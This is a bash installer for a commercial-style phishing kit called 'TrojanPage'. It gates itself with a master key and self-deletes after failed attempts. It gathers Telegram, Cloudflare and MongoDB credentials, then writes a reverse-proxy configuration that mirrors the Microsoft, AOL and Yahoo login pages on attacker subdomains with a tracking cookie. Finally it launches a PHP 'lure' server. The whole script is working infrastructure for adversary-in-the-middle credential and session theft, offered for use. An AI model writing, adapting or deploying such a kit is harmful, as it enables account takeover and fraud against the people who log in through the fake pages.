#!/bin/bash
# 🏛️ TROJANPAGE - THE DASHBOARD EDITION (V4.0)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# --- 1. THE TROJANPAGE HEADER ---
show_header() {
    clear
    echo -e "${BLUE}"
    echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
    echo -e "${NC}"
    echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
    echo " ----------------------------------------------------------------------------------"
}

# --- 2. MASTER KEY SETTINGS ---
MASTER_KEY="TROJAN-PRO-2026"
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')

# --- 3. GATEKEEPER LOCK ---
ATTEMPTS=0
while [ $ATTEMPTS -lt 3 ]; do
    show_header
    echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"
    echo -e "${BLUE}[!] Unauthorized. Enter Master Key.${NC}"
    read -p "ENTER KEY: " USER_INPUT
    CLEAN_INPUT=$(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')
    if [ "$CLEAN_INPUT" == "$MASTER_KEY" ]; then
        echo -e "${GREEN}[success] Access Granted.${NC}"; sleep 1; break
    else
        ATTEMPTS=$((ATTEMPTS + 1))
        echo -e "${RED}[error] Invalid Key. ($ATTEMPTS/3)${NC}"; sleep 1
    fi
    [ $ATTEMPTS -eq 3 ] && { rm -- "$0"; exit 1; }
done

# --- 4. CONFIGURATION WIZARD ---
sudo apt update && sudo apt install -y curl mongodb-clients golang-go git make screen php-cli unzip > /dev/null 2>&1
VPS_IP=$(curl -s https://api.ipify.org)

# TELEGRAM
read -p "Enter Telegram Bot Token: " TG_TOKEN
read -p "Enter Telegram Chat ID: " TG_ID

# CLOUDFLARE
read -p "Enter Cloudflare API Token: " CF_TOKEN
read -p "Enter Your Domain (e.g. motarmo.click): " USER_DOMAIN

# MONGODB
read -p "Enter Mongo Host: " M_HOST
read -p "Enter Mongo User: " M_USER
read -p "Enter Mongo Pass: " M_PASS
M_URI="mongodb+srv://$M_USER:$M_PASS@$M_HOST/trojan_db?retryWrites=true&w=majority"

# --- 5. DASHBOARD CONFIG GENERATION ---
# This creates the "Sites" list from your screenshot
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "listeningPortHTTP": 8080,
  "trackingCookie": "ident",
  "proxyRules": [
    {"hostname": "office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"},
    {"hostname": "yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"}
  ],
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "cfToken": "$CF_TOKEN",
  "mongodb": "$M_URI"
}
EOF

# --- 6. CREATE DASHBOARD RUN SCRIPT ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'
CONFIG="/root/config.json"
DOMAIN=$(grep -oP '(?<="proxyDomain": ")[^"]*' $CONFIG)

clear
echo -e "${BLUE}******************************************************************${NC}"
echo -e "${BLUE}* id * sites     * mitm    * host            * proxy    * unauth_url *${NC}"
echo -e "${BLUE}******************************************************************${NC}"
echo -e "* 1  * aol       * ${GREEN}online${NC}  * $DOMAIN      * disabled * https://... *"
echo -e "* 2  * office    * ${GREEN}online${NC}  * $DOMAIN      * disabled * https://... *"
echo -e "* 3  * yahoo     * ${GREEN}online${NC}  * $DOMAIN      * disabled * https://... *"
echo -e "${BLUE}******************************************************************${NC}"
echo ""
echo -e "${BLUE}[+] Launching Reverse Proxy Dashboard...${NC}"

sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill -9 proxy && pkill -9 php
screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
cd /root/engine/dist/ && ./proxy -config /root/config.json
EOF

# --- 7. FINAL SETUP ---
chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
sudo ln -sf /root/run.sh /usr/local/bin/run
echo "$HWID:$(($(date +%s) + 7776000))" > /root/.license

echo -e "\n${GREEN}[success] DASHBOARD DEPLOYED.${NC}"
echo -e "${BLUE}[!] IMPORTANT: Point $USER_DOMAIN to $VPS_IP in Cloudflare (DNS ONLY).${NC}"
